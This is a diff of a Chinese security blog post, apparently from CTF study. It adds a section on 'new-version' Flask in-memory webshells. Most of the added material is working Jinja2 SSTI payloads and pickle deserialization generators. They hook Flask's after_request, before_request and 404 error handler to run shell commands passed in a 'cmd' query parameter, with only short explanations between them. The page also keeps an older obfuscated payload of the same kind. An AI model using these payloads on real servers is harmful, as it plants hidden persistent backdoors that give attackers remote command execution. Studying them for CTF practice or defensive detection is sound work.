@@ -309,10 +309,11 @@
             <li><a href="#小结">小结</a></li>
           </ol>
         </li>
-        <li><a href="#python-flask-ssti-内存马">python flask ssti 内存马</a>
+        <li><a href="#python-flask--内存马">python flask  内存马</a>
           <ol>
             <li><a href="#原理-1">原理</a></li>
             <li><a href="#绕过">绕过</a></li>
+            <li><a href="#新版flask内存马">新版Flask内存马</a></li>
             <li><a href="#小结-1">小结</a></li>
           </ol>
         </li>
@@ -400,7 +401,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 8 分钟
+                    阅读时长: 11 分钟
                 </time>
             </div>
         
@@ -475,7 +476,7 @@
 <p>**usleep(10000)：**等待1秒后继续循环，这个睡眠操作是为了降低脚本的资源消耗，避免被系统检测到异常行为。</p>
 <h4 id="小结">小结
 </h4><p>php不死马的利用情况很少，一般文件上传的题目也不用不到，这里也就是简单学习一下，可以更深入理解内存马</p>
-<h3 id="python-flask-ssti-内存马">python flask ssti 内存马
+<h3 id="python-flask--内存马">python flask  内存马
 </h3><h4 id="原理-1">原理
 </h4><p>​	底层原理就是下面这个函数，这里不多赘述，详情可见ssti篇</p>
 <div class="highlight"><div class="chroma">
@@ -598,8 +599,202 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">get_flashed_messages|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;__builtins__&#34;)|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\u0065\u0076\u0061\u006c&#34;)(&#34;app.add_ur&#34;+&#34;l_rule(&#39;/h3rmesk1t&#39;, &#39;h3rmesk1t&#39;, la&#34;+&#34;mbda :__imp&#34;+&#34;ort__(&#39;o&#34;+&#34;s&#39;).po&#34;+&#34;pen(_request_c&#34;+&#34;tx_stack.to&#34;+&#34;p.re&#34;+&#34;quest.args.get(&#39;shell&#39;)).re&#34;+&#34;ad())&#34;,{&#39;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#39;:get_flashed_messages|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#34;),&#39;app&#39;:get_flashed_messages|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&#34;)})
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h4 id="新版flask内存马">新版Flask内存马
+</h4><p>在极客2024的复现中遇到了pickle打内存马的，而且老版的<code>add_url_rule</code>函数已经不支持用于注册路由了，来记录一下</p>
+<p>首先是ssti的</p>
+<p>用了<code>after_request</code>钩子函数在当前页面添加恶意回调函数，在每次请求过后都会调用一次。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]})}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span> 
+</span></span><span class="line"><span class="cl">  <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;request&#39;</span><span class="p">:</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;app&#39;</span><span class="p">:</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们来解析一下：</p>
+<p>首先是<code>url_for.__globals__['__builtins__']['eval']</code>这个就不多说了。</p>
+<p>然后是包裹在cmd中的<code>app.after_request_funcs.setdefault(None, []).append(...)</code> 这个函数解析如下，作用是注册<strong>后处理</strong>钩子</p>
+<ul>
+<li><code>after_request_funcs</code>：Flask 的请求后处理回调列表</li>
+<li><code>setdefault(None, [])</code>：为全局回调创建空列表</li>
+<li><code>append(...)</code>：添加恶意回调函数</li>
+</ul>
+<p>然后就是添加的回调函数lambda，内容是如果存在cmd参数并，返回带有命令执行的响应，若不存在cmd参数，就返回原来的参数。</p>
+<p>当然不止这一种钩子函数可以用，也可以通过<code>error_handler</code>注册所有404页面成为内存马，太帅了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;exec(</span><span class="se">\&#34;</span><span class="s2">global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]})}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;exec(</span><span class="se">\&#34;</span><span class="s2">global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]}</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接分析exec中的部分</p>
+<p><code>exc_class, code = app._get_exc_class_and_code(404);</code></p>
+<ul>
+<li><strong>作用</strong>：获取处理 HTTP 404 错误所需的具体异常类和状态码。</li>
+<li><code>app</code>：就是前面获取的 Flask 应用实例。</li>
+<li><code>_get_exc_class_and_code(404)</code>：这是 Flask 的一个内部方法。调用它会返回一个元组，例如 <code>(werkzeug.exceptions.NotFound, 404)</code>。</li>
+<li>所以，执行后 <code>exc_class</code> 变量会是 <code>NotFound</code> 这个异常类，<code>code</code> 变量会是整数 <code>404</code>。</li>
+</ul>
+<p><code>app.error_handler_spec[None][code][exc_class] = ...</code></p>
+<ul>
+<li><strong>作用</strong>：定位并准备<strong>覆盖</strong> Flask 的 404 错误处理器。</li>
+<li><code>app.error_handler_spec</code>：这是 Flask 内部用来存储所有错误处理函数的一个字典。它的结构大致是 <code>[蓝图名称][状态码][异常类]</code>。</li>
+<li><code>[None]</code>：表示我们修改的是全局的错误处理器，而不是某个特定蓝图（Blueprint）的。</li>
+<li><code>[code]</code>：就是 <code>[404]</code>。</li>
+<li><code>[exc_class]</code>：就是 <code>[werkzeug.exceptions.NotFound]</code>。</li>
+<li><strong>连起来看</strong>：这行代码精确定位到了 Flask 应用中负责处理“404 Not Found”错误的那个函数指针。</li>
+</ul>
+<p><code>= lambda a: __import__('os').popen(request.args.get('cmd')).read()</code></p>
+<p>这个比较简单就不讲了</p>
+<p>当然有after_request就有before_request，这里尝试照葫芦画瓢手搓一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span> 
+</span></span><span class="line"><span class="cl">  <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;app.before_request_funcs.setdefault(None, []).append(lambda: request.args.get(&#39;cmd&#39;) and __import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;request&#39;</span><span class="p">:</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;app&#39;</span><span class="p">:</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后是通过pickle实现，这里就直接贴代码了，实现思路也大差不差。</p>
+<p><code>error_handler</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,(</span><span class="s2">&#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>after_request</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;shell&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>before_request</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(</span><span class="se">\&#34;</span><span class="s2">sys</span><span class="se">\&#34;</span><span class="s2">).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div><h4 id="小结-1">小结
-</h4><p>​	python flask ssti 内存马到这也就差不多了，主要能使用的地方是一些无回显的ssti，或者反序列化，可以搭配packle反序列化一起食用。最后附上文章</p>
+</h4><p>​	python flask  内存马到这也就差不多了，主要能使用的地方是一些无回显的ssti，或者反序列化，可以搭配packle反序列化一起食用。最后附上文章</p>
 <p><a class="link" href="https://xz.aliyun.com/news/10381"  target="_blank" rel="noopener"
     >Python 内存马分析-先知社区</a></p>
 <h3 id="python-bottle-ssti内存马">python bottle ssti内存马
